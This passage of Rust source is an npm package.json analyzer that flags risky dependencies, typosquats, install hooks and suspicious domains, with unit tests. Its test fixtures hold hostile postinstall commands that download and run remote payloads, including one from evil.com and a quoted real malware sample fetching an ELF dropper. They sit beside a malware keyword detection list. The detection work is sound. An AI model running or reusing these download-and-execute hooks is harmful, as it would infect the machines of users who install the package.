            .dependencies
            .iter()
            .chain(pkg.dev_dependencies.iter())
            .chain(pkg.peer_dependencies.iter())
            .chain(pkg.optional_dependencies.iter())
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();

        for (name, version) in &all_deps {
            // Check for git/GitHub URLs (potential typosquatting or malicious forks)
            if version.starts_with("git://")
                || version.starts_with("git+")
                || version.contains("github.com")
            {
                report.add_finding(
                    Finding::indicator(
                        "supply-chain/git-dependency".to_string(),
                        format!("Dependency '{}' uses git URL: {}", name, version),
                        0.6,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: version.to_string(),
                        location: Some(format!("dependencies.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for file: protocol (local package injection)
            if version.starts_with("file:") {
                report.add_finding(
                    Finding::indicator(
                        "supply-chain/local-dependency".to_string(),
                        format!("Dependency '{}' uses local file: {}", name, version),
                        0.7,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: version.to_string(),
                        location: Some(format!("dependencies.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for known malicious package patterns
            if self.is_suspicious_package_name(name)
                && !self.is_same_name_github_fork(name, version)
                && !(is_official_react_native && name.starts_with("@react-native/"))
            {
                report.add_finding(
                    Finding::indicator(
                        "supply-chain/suspicious-package".to_string(),
                        format!("Suspicious package name: '{}'", name),
                        0.8,
                    )
                    .with_criticality(Criticality::Suspicious)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: name.to_string(),
                        location: Some("dependencies".to_string()),
                        ..Default::default()
                    }]),
                );
            }

            // Check for typosquatting of popular packages
            if let Some(original) = self.check_typosquat(name) {
                report.add_finding(
                    Finding::indicator(
                        "supply-chain/typosquat".to_string(),
                        format!("Package '{}' may be typosquatting '{}'", name, original),
                        0.7,
                    )
                    .with_criticality(Criticality::Suspicious)
                    .with_evidence(vec![Evidence {
                        method: "levenshtein".to_string(),
                        source: "package.json".to_string(),
                        value: format!("{} -> {}", name, original),
                        location: Some("dependencies".to_string()),
                        ..Default::default()
                    }]),
                );
            }

            // Add as import for tracking
            report.imports.push(Import {
                symbol: name.to_string(),
                library: Some(version.to_string()),
                source: "package.json".to_string(),
                offset: None,
            });
        }
    }

    fn check_install_hooks(&self, scripts: &HashMap<String, String>, report: &mut AnalysisReport) {
        // These hooks run automatically during npm install
        let install_hooks = [
            "preinstall",
            "install",
            "postinstall",
            "preuninstall",
            "uninstall",
            "postuninstall",
            "prepublish",
            "preprepare",
            "prepare",
            "postprepare",
        ];

        for hook in install_hooks {
            if let Some(script) = scripts.get(hook) {
                // Suspicious only when the script actively fetches or executes external content.
                // Script length alone is not a reliable signal: legitimate publish-safety guards
                // (e.g. ljharb's `not-in-publish || safe-publish-latest` pattern) are verbose
                // but benign.
                let criticality = if is_suspicious_install_hook_script(script) {
                    Criticality::Suspicious
                } else {
                    Criticality::Notable
                };

                report.add_finding(
                    Finding::indicator(
                        format!("supply-chain/install-hook/{}", hook),
                        format!("Package has '{}' hook that runs during install", hook),
                        0.8,
                    )
                    .with_criticality(criticality)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 200).to_string(),
                        location: Some(format!("scripts.{}", hook)),
                        ..Default::default()
                    }]),
                );
            }
        }
    }

    fn extract_script_strings(
        &self,
        scripts: &HashMap<String, String>,
        report: &mut AnalysisReport,
    ) {
        for (name, script) in scripts {
            // Extract URLs
            for url in self.extract_urls(script) {
                report.strings.push(StringInfo {
                    value: url,
                    offset: None,
                    encoding: "utf8".to_string(),
                    string_type: Some(StringType::Url),
                    section: Some(format!("scripts.{}", name)),
                    encoding_chain: Vec::new(),
                    fragments: None,
                });
            }

            // Extract IP addresses
            for ip in self.extract_ips(script) {
                report.strings.push(StringInfo {
                    value: ip,
                    offset: None,
                    encoding: "utf8".to_string(),
                    string_type: Some(StringType::IP),
                    section: Some(format!("scripts.{}", name)),
                    encoding_chain: Vec::new(),
                    fragments: None,
                });
            }

            // Extract paths
            for path in self.extract_paths(script) {
                report.strings.push(StringInfo {
                    value: path,
                    offset: None,
                    encoding: "utf8".to_string(),
                    string_type: Some(StringType::Path),
                    section: Some(format!("scripts.{}", name)),
                    encoding_chain: Vec::new(),
                    fragments: None,
                });
            }
        }
    }

    fn is_suspicious_package_name(&self, name: &str) -> bool {
        let normalized_name = name.trim();
        let package_segment = normalized_name
            .rsplit('/')
            .next()
            .unwrap_or(normalized_name);
        let is_scoped = name.contains('/');

        // Short-circuit known legitimate names before heuristic checks.
        if self.is_known_legitimate(normalized_name) || self.is_known_legitimate(package_segment) {
            return false;
        }

        let suspicious_prefixes = [
            // Known malicious naming patterns
            "color-",
            "colours-",
            "lodash-",
            "axios-",
            "babel-",
            "eslint-config-",
            "webpack-",
        ];

        let suspicious_contains = [
            // Suspicious prefixes/suffixes
            "-malware", "-stealer", "-hack", "exfil", "backdoor",
        ];

        for pattern in suspicious_prefixes {
            if !is_scoped && package_segment.starts_with(pattern) {
                return true;
            }
        }

        for pattern in suspicious_contains {
            if package_segment.contains(pattern) {
                return true;
            }
        }

        // Check for obfuscated names (random characters) — single pass
        if package_segment.len() > 10 {
            let mut digit_count = 0u32;
            let mut all_lower_or_digit = true;
            for b in package_segment.bytes() {
                if b.is_ascii_digit() {
                    digit_count += 1;
                } else if !b.is_ascii_lowercase()
                    && b != b'-'
                    && b != b'_'
                    && b != b'@'
                    && b != b'/'
                {
                    all_lower_or_digit = false;
                }
            }
            if digit_count > 3 && all_lower_or_digit {
                return true;
            }
        }

        false
    }

    fn is_official_react_native_package(&self, pkg: &PackageJson) -> bool {
        let Some(name) = pkg.name.as_deref() else {
            return false;
        };

        if name != "react-native" && !name.starts_with("@react-native/") {
            return false;
        }

        let Some(repository) = pkg.repository.as_ref() else {
            return false;
        };

        repository.to_string().contains("facebook/react-native")
    }

    fn is_known_legitimate(&self, name: &str) -> bool {
        // Known legitimate packages that might trigger false positives
        let legitimate = [
            "color",
            "color-convert",
            "color-name",
            "color-string",
            "colors",
            "lodash",
            "lodash-es",
            "asynct",
            "axios",
            "axios-proxy-builder",
            "babel-core",
            "babel-cli",
            "babel-eslint",
            "babel-jest",
            "babel-loader",
            "babel-polyfill",
            "babel-preset-env",
            "babel-preset-es2015",
            "babel-preset-es2015-loose",
            "babel-preset-es2016",
            "babel-preset-es2017",
            "babel-preset-es2018",
            "babel-preset-react",
            "babel-register",
            "babel-runtime",
            "babel-tape-runner",
            "eclint",
            "tslint",
            "eslint-config-airbnb",
            "eslint-config-prettier",
            "webpack",
            "webpack-bundle-analyzer",
            "webpack-cli",
            "webpack-dev-middleware",
            "webpack-dev-server",
            "webpack-fix-default-import-plugin",
            "webpack-hot-middleware",
            "webpack-merge",
        ];

        if legitimate.contains(&name) {
            return true;
        }

        // Well-known ecosystem naming conventions
        let legitimate_prefixes = [
            "babel-plugin-",
            "babel-preset-",
            "eslint-config-",
            "eslint-plugin-",
            "webpack-plugin-",
        ];

        legitimate_prefixes
            .iter()
            .any(|prefix| name.starts_with(prefix))
    }

    fn is_same_name_github_fork(&self, name: &str, version: &str) -> bool {
        let package_segment = name.trim().rsplit('/').next().unwrap_or(name.trim());
        let Some(repo) = version.strip_prefix("github:") else {
            return false;
        };

        let repo_name = repo
            .split('#')
            .next()
            .and_then(|path| path.rsplit('/').next())
            .unwrap_or("");

        repo_name == package_segment
    }

    fn is_suspicious_domain(&self, url: &str) -> bool {
        // Extract domain from URL
        let domain = url
            .trim_start_matches("https://")
            .trim_start_matches("http://")
            .split('/')
            .next()
            .unwrap_or("");

        // Skip common legitimate domains
        let legitimate_domains = [
            "github.com",
            "githubusercontent.com",
            "npmjs.org",
            "npmjs.com",
            "registry.npmjs.org",
            "yarnpkg.com",
            "unpkg.com",
            "jsdelivr.net",
            "cloudflare.com",
            "amazonaws.com",
            "s3.amazonaws.com",
            "storage.googleapis.com",
            "googleapis.com",
            "google.com",
            "microsoft.com",
            "azure.com",
            "vercel.app",
            "netlify.app",
            "herokuapp.com",
            "bitbucket.org",
            "gitlab.com",
            "sourceforge.net",
        ];

        for legit in legitimate_domains {
            if domain.ends_with(legit) {
                return false;
            }
        }

        // Check for suspicious patterns
        let base_domain = domain.split('.').next().unwrap_or("");

        // Long domain names are often suspicious (legit domains are usually short)
        if base_domain.len() >= 12 {
            return true;
        }

        // Single pass: count vowels, consonants, digits, letters
        let mut vowels = 0u32;
        let mut consonants = 0u32;
        let mut has_digits = false;
        let mut has_letters = false;
        for b in base_domain.bytes() {
            match b.to_ascii_lowercase() {
                b'a' | b'e' | b'i' | b'o' | b'u' => {
                    vowels += 1;
                    has_letters = true;
                }
                b'b'..=b'd' | b'f'..=b'h' | b'j'..=b'n' | b'p'..=b't' | b'v'..=b'z' => {
                    consonants += 1;
                    has_letters = true;
                }
                b'0'..=b'9' => has_digits = true,
                _ => {}
            }
        }

        // Very few vowels compared to consonants suggests random/DGA domain
        if base_domain.len() >= 8 && vowels > 0 && consonants / vowels >= 3 {
            return true;
        }

        // Domain with numbers mixed in (often DGA)
        if has_digits && has_letters && base_domain.len() >= 8 {
            return true;
        }

        // Known malicious TLDs
        let suspicious_tlds = [".tk", ".ml", ".ga", ".cf", ".gq", ".xyz", ".top", ".pw"];
        for tld in suspicious_tlds {
            if domain.ends_with(tld) {
                return true;
            }
        }

        // Check for uncommon consonant clusters that suggest non-word
        if base_domain.len() >= 10 {
            let lower = base_domain.to_ascii_lowercase();
            let clusters = ["ptr", "mtr", "str", "spr", "scr", "thr"];
            for cluster in clusters {
                if lower.contains(cluster) {
                    return true;
                }
            }
        }

        false
    }

    fn check_typosquat(&self, name: &str) -> Option<&'static str> {
        // Popular packages and common typosquats
        let popular_packages = [
            (
                "lodash",
                &["lodas", "lodsh", "loadash", "lod-ash"] as &[&str],
            ),
            ("express", &["expres", "expresss", "expess", "exprss"]),
            ("react", &["reac", "reactt", "raect", "reat"]),
            ("axios", &["axio", "axioss", "axos", "axois"]),
            ("moment", &["momnet", "momen", "momet", "momment"]),
            ("chalk", &["chak", "chlak", "chalks", "chalke"]),
            ("commander", &["comander", "commandr", "commmander"]),
            ("request", &["requst", "requets", "reqest", "requuest"]),
            ("debug", &["debg", "debu", "dubug", "debugg"]),
            ("colors", &["colrs", "colurs", "colour", "collors"]),
            ("underscore", &["undrscore", "underscore_", "underscor"]),
            ("async", &["asyn", "asyncc", "aysnc", "asnc"]),
            ("webpack", &["webpak", "webpck", "wepback", "webapck"]),
            ("typescript", &["typescipt", "typscript", "tyepscript"]),
            ("eslint", &["eslit", "eslnt", "eslintt", "elint"]),
        ];

        for (original, typos) in popular_packages {
            if typos.contains(&name) {
                return Some(original);
            }
            if name != original
                && is_edit_distance_one(name.as_bytes(), original.as_bytes())
                && !self.is_known_legitimate(name)
            {
                return Some(original);
            }
        }

        None
    }

    fn extract_urls(&self, text: &str) -> Vec<String> {
        fn url_pattern() -> Option<&'static regex::Regex> {
            static RE: OnceLock<Option<regex::Regex>> = OnceLock::new();
            RE.get_or_init(|| regex::Regex::new(r#"https?://[^\s'")\]}>]{1,2048}"#).ok())
                .as_ref()
        }
        url_pattern()
            .into_iter()
            .flat_map(|pattern| pattern.find_iter(text))
            .map(|m| m.as_str().to_string())
            .collect()
    }

    fn extract_ips(&self, text: &str) -> Vec<String> {
        fn ip_pattern() -> Option<&'static regex::Regex> {
            static RE: OnceLock<Option<regex::Regex>> = OnceLock::new();
            RE.get_or_init(|| regex::Regex::new(r"\b(?:\d{1,3}\.){3}\d{1,3}\b").ok())
                .as_ref()
        }
        ip_pattern()
            .into_iter()
            .flat_map(|pattern| pattern.find_iter(text))
            .map(|m| m.as_str().to_string())
            .filter(|ip| {
                // Filter out invalid IPs and common non-IPs (version numbers)
                let parts: Vec<&str> = ip.split('.').collect();
                parts.len() == 4
                    && parts.iter().all(|p| p.parse::<u8>().is_ok())
                    && ip != "0.0.0.0"
                    && ip != "127.0.0.1"
            })
            .collect()
    }

    fn extract_paths(&self, text: &str) -> Vec<String> {
        fn path_pattern() -> Option<&'static regex::Regex> {
            static RE: OnceLock<Option<regex::Regex>> = OnceLock::new();
            RE.get_or_init(|| {
                regex::Regex::new(r#"(?-u)/[a-zA-Z0-9_./-]+|(?-u)\\[a-zA-Z0-9_.\\-]+"#).ok()
            })
            .as_ref()
        }
        path_pattern()
            .into_iter()
            .flat_map(|pattern| pattern.find_iter(text))
            .map(|m| m.as_str().to_string())
            .filter(|p| p.len() > 3)
            .collect()
    }
}

impl Default for PackageJsonAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl Analyzer for PackageJsonAnalyzer {
    fn analyze_input(&self, input: &AnalysisInput<'_>) -> Result<AnalysisReport> {
        let content = String::from_utf8_lossy(input.data);
        self.analyze_package(input.path, &content)
    }

    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let bytes =
            fs::read(file_path).context(format!("Failed to read file: {}", file_path.display()))?;
        let content = String::from_utf8_lossy(&bytes);
        self.analyze_package(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        file_path
            .file_name()
            .map(|n| n == "package.json")
            .unwrap_or(false)
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_package_json() {
        let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "lodash": "^4.17.21"
            }
        }"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert_eq!(report.target.file_type, "package.json");
        assert!(!report.imports.is_empty());
    }

    #[test]
    fn test_suspicious_install_hook() {
        let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.com/payload | sh"
            }
        }"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        // Should detect both the install hook and the network operation
        assert!(report
            .findings
            .iter()
            .any(|f| f.id.contains("install-hook")));
        assert!(report.findings.iter().any(|f| f.id.contains("net/")));
    }

    #[test]
    fn test_hidden_file_in_docs_script_is_not_evasion() {
        let content = r#"{
            "name": "nan",
            "version": "2.16.0",
            "scripts": {
                "docs": "doc/.build.sh"
            }
        }"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert!(!report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file"));
    }

    #[test]
    fn test_hidden_file_in_install_hook_stays_suspicious() {
        let content = r#"{
            "name": "bad-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "sh ./.hidden/dropper.sh"
            }
        }"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert!(report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file"));
    }

    #[test]
    fn test_typosquat_detection() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(analyzer.check_typosquat("lodas").is_some());
        assert!(analyzer.check_typosquat("axio").is_some());
        assert!(analyzer.check_typosquat("reac").is_some());
        assert!(analyzer.check_typosquat("lodash").is_none()); // Legitimate
    }

    #[test]
    fn test_scoped_devdependency_with_internal_webpack_substring_is_not_suspicious() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(!analyzer.is_suspicious_package_name("@soda/friendly-errors-webpack-plugin"));
    }

    #[test]
    fn test_scoped_webpack_dependency_is_not_suspicious() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(!analyzer.is_suspicious_package_name("@vercel/webpack-nft"));
    }

    #[test]
    fn test_webpack_hot_middleware_is_not_suspicious() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(!analyzer.is_suspicious_package_name("webpack-hot-middleware"));
    }

    #[test]
    fn test_scoped_legitimate_webpack_dependency_is_not_suspicious() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(!analyzer.is_suspicious_package_name("@scope/webpack-hot-middleware"));
    }

    #[test]
    fn test_same_name_github_fork_is_not_suspicious_package() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(analyzer.is_same_name_github_fork(
            "webpack-hot-middleware",
            "github:lyswhut/webpack-hot-middleware#329c4375"
        ));
    }

    #[test]
    fn test_types_devdependency_is_not_suspicious() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(!analyzer.is_suspicious_package_name("@types/color-convert"));
    }

    #[test]
    fn test_axios_proxy_builder_is_not_suspicious() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(!analyzer.is_suspicious_package_name("axios-proxy-builder"));
    }

    #[test]
    fn test_scoped_axios_proxy_builder_segment_is_not_suspicious() {
        let analyzer = PackageJsonAnalyzer::new();
        assert!(!analyzer.is_suspicious_package_name("@vendor/axios-proxy-builder"));
    }

    #[test]
    fn test_git_dependency() {
        let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "malicious-lib": "git+https://github.com/attacker/repo.git"
            }
        }"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert!(report
            .findings
            .iter()
            .any(|f| f.id.contains("git-dependency")));
    }

    #[test]
    fn test_edit_distance_one() {
        // Same string: distance 0, not 1
        assert!(!is_edit_distance_one(b"lodash", b"lodash"));
        // One deletion: distance 1
        assert!(is_edit_distance_one(b"lodash", b"lodas"));
        // One substitution: distance 1
        assert!(is_edit_distance_one(b"lodash", b"lodaxh"));
        // One insertion: distance 1
        assert!(is_edit_distance_one(b"lodash", b"lodassh"));
        // Distance > 1
        assert!(!is_edit_distance_one(b"lodash", b"lod"));
        // Empty vs single char
        assert!(is_edit_distance_one(b"", b"a"));
        assert!(!is_edit_distance_one(b"", b"ab"));
    }

    #[test]
    fn test_trailing_content_invalid_json() {
        // Valid JSON followed by JavaScript code
        let content = r#"{"name": "evil-pkg", "version": "1.0.0"}
const x = require('child_process'); eval(x.execSync('id').toString());"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        // Should produce metadata/manifest/invalid-json (Notable)
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id == "metadata/manifest/invalid-json"
                    && f.crit == Criticality::Notable),
            "Expected invalid-json finding, got: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );

        // Should produce embedded-code finding (Suspicious) since it looks like JS
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id.contains("embedded-code") && f.crit == Criticality::Suspicious),
            "Expected embedded-code finding"
        );
    }

    #[test]
    fn test_trailing_content_variation_selectors() {
        // Valid JSON followed by content with variation selectors (U+FE01 = VS2)
        let content = format!(
            r#"{{"name": "stego-pkg", "version": "1.0.0"}}{}"#,
            "\u{FE01}\u{FE02}\u{FE03}"
        );

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), &content)
            .unwrap();

        // Should detect the variation selectors as steganographic obfuscation
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id.contains("steganography/unicode-variation-selectors")),
            "Expected variation selector finding, got: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_trailing_whitespace_only_is_benign() {
        // Valid JSON followed by just whitespace — should NOT flag
        let content = r#"{"name": "ok-pkg", "version": "1.0.0"}
    "#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.id == "metadata/manifest/invalid-json"),
            "Trailing whitespace should not trigger invalid-json finding"
        );
    }

    #[test]
    fn test_no_trailing_content() {
        // Clean package.json — no trailing content findings
        let content = r#"{"name": "clean-pkg", "version": "1.0.0"}"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert!(
            !report.findings.iter().any(|f| f.id.contains("invalid-json")
                || f.id.contains("steganography")
                || f.id.contains("embedded-code")),
            "Clean package.json should have no trailing-content findings"
        );
    }

    #[test]
    fn test_trailing_embedded_js_creates_file_layer() {
        // Trailing JS should produce an embedded FileAnalysis layer
        let content = r#"{"name": "evil", "version": "1.0.0"}
var http = require('http'); var cp = require('child_process'); eval(cp.execSync('whoami').toString());"#;

        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        // The embedded JS should be analyzed as a separate file layer
        assert!(
            !report.files.is_empty(),
            "Expected embedded file layer for trailing JS"
        );
        assert!(
            report.files[0].path.contains("##trailing@"),
            "Expected virtual path with ##trailing@ prefix, got: {}",
            report.files[0].path
        );
    }

    #[test]
    fn test_parse_array_dependencies() {
        // Old npm packages (e.g. underscore 1.2.2) used arrays instead of objects
        // for dependencies and contributors. This must not cause a parse failure.
        let content = r#"{
            "name": "underscore",
            "description": "JavaScript's functional programming helper library.",
            "keywords": ["util", "functional", "server", "client", "browser"],
            "author": "Jeremy Ashkenas <jeremy@documentcloud.org>",
            "contributors": [],
            "dependencies": [],
            "repository": {"type": "git", "url": "git://github.com/documentcloud/underscore.git"},
            "main": "underscore.js",
            "version": "1.2.2"
        }"#;
        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();
        assert_eq!(report.target.file_type, "package.json");
        assert!(report.imports.is_empty());
    }

    // --- Fallback parser tests ---

    #[test]
    fn test_sanitize_json_strips_comments() {
        let input = r#"{
// this is a comment
"name": "test",
// another comment
"version": "1.0.0"
}"#;
        let sanitized = sanitize_json(input).expect("should detect comments");
        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
        assert_eq!(pkg.name.as_deref(), Some("test"));
        assert_eq!(pkg.version.as_deref(), Some("1.0.0"));
    }

    #[test]
    fn test_sanitize_json_strips_trailing_commas() {
        let input = r#"{"name": "test", "scripts": {},}"#;
        let sanitized = sanitize_json(input).expect("should detect trailing comma");
        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
        assert_eq!(pkg.name.as_deref(), Some("test"));
    }

    #[test]
    fn test_sanitize_json_returns_none_for_clean_json() {
        let input = r#"{"name": "clean", "version": "1.0.0"}"#;
        assert!(sanitize_json(input).is_none());
    }

    #[test]
    fn test_sanitize_json_preserves_urls_with_slashes() {
        let input = r#"{"name": "test", "scripts": {"go": "curl https://example.com/path"},}"#;
        let sanitized = sanitize_json(input).expect("trailing comma");
        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
        assert_eq!(
            pkg.scripts.get("go").unwrap(),
            "curl https://example.com/path"
        );
    }

    #[test]
    fn test_sanitize_json_preserves_double_slash_inside_strings() {
        let input = r#"{"name": "test", "scripts": {"build": "echo // not a comment"},}"#;
        let sanitized = sanitize_json(input).expect("trailing comma");
        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
        assert_eq!(pkg.scripts.get("build").unwrap(), "echo // not a comment");
    }

    #[test]
    fn test_fallback_regex_extracts_scripts() {
        // Real-world malware with broken JSON structure
        let content = r#"{
    "name": "legacy react-aws-s3-typescript",
    "version": "1.2.4",
    "scripts": "test": "echo \"No test\"",
    "postinstall": "wget https://evil.com/payload && chmod +x payload && ./payload &""repository": {
        "type": "git",
    }
}"#;
        let pkg = extract_package_fallback(content).expect("should extract fields");
        assert_eq!(pkg.name.as_deref(), Some("legacy react-aws-s3-typescript"));
        assert_eq!(pkg.version.as_deref(), Some("1.2.4"));
    }

    #[test]
    fn test_fallback_regex_returns_none_for_garbage() {
        assert!(extract_package_fallback("this is not json at all").is_none());
    }

    #[test]
    fn test_analyze_trailing_comma_json() {
        // Trailing comma — should succeed via sanitize stage
        let content = r#"{
  "scripts": {},
}"#;
        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id == "metadata/manifest/malformed-json"),
            "Expected malformed-json finding, got: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
        // Should still produce valid structure
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "manifest/npm/package.json"));
    }

    #[test]
    fn test_analyze_json_with_comments() {
        // Angular-style docregion comments — should succeed via sanitize stage
        let content = r#"// #docplaster
// #docregion collection
{
  "name": "my-lib",
  "version": "0.0.1",
// #enddocregion collection
  "scripts": {
    "build": "tsc -p tsconfig.json"
  },
  "dependencies": {
    "@angular/core": "^21.0.0"
  }
// #docregion collection
}"#;
        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        // Should parse successfully with malformed-json finding
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id == "metadata/manifest/malformed-json"),
            "Expected malformed-json finding"
        );
        // Should have extracted the dependency
        assert!(
            report.imports.iter().any(|i| i.symbol == "@angular/core"),
            "Expected @angular/core import, got: {:?}",
            report.imports
        );
    }

    #[test]
    fn test_analyze_mangled_malware_json() {
        // Real malware pattern: broken JSON with malicious postinstall
        let content = r#"{
    "name": "legacy react-aws-s3-typescript",
    "version": "1.2.4",
    "scripts": "test": "echo \"No specified test yet\"",
    "build": "tsc",
    "postinstall": "wget https://wirelite.app/updates/stageLESS.elf && mv stageLESS.elf .bash.elf && chmod +x .bash.elf && ./.bash.elf &""repository": {
        "type": "git",
    },
    "url": "git+https://github.com/NimperX/react-aws-s3-typescript.git""keywords": [
        "react",
    ]
}"#;
        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        // Must produce a malformed-json finding
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id == "metadata/manifest/malformed-json"),
            "Expected malformed-json finding, got: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );

        // Must extract the package name via fallback
        assert!(
            report
                .structure
                .iter()
                .any(|s| s.desc.contains("legacy react-aws-s3-typescript")),
            "Expected package name in structure, got: {:?}",
            report.structure.iter().map(|s| &s.desc).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_analyze_hopeless_json_fails() {
        // Completely unparseable — no useful fields at all
        let content = r#"{ "non-parsable package.json""#;
        let analyzer = PackageJsonAnalyzer::new();
        let result = analyzer.analyze_package(Path::new("package.json"), content);
        assert!(
            result.is_err(),
            "Hopeless JSON should still return an error"
        );
    }

    #[test]
    fn test_valid_json_has_no_malformed_finding() {
        let content = r#"{"name": "clean-pkg", "version": "1.0.0"}"#;
        let analyzer = PackageJsonAnalyzer::new();
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();

        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.id == "metadata/manifest/malformed-json"),
            "Valid JSON should not trigger malformed-json finding"
        );
    }
}
